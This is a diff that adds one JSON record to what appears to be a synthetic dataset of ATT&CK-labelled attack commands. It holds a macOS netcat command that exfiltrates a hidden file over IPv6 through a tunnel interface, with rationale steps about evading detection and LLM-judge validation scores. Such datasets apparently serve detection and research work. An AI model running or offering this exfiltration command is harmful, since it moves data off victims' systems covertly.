@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
+  "explanation": "Forces IPv6 TCP exfiltration over a secondary VPN/tunnel interface (utun4) to a link-local address on a high port, using an alternate medium per T1011.",
+  "rationale_steps": [
+    "Retrieve the utun4 IPv6 address with ipconfig to bind the source.",
+    "Send the data using TCP to a scoped link-local destination.",
+    "Use a non-standard port to reduce detection while keeping to the alternate medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-f93c25ff",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid nc flags (-6, -s), balanced quoting and command substitution, a correctly formatted IPv6 link-local address with zone index, and proper input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates the file over IPv6 bound to utun4 to a link\u2011local peer as described, but the cited ATT&CK description (System Script Proxy Execution) does not match this netcat-based exfiltration and success depends on utun4 having an IPv6 address and a reachable link-local target.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T22:23:58.461731Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
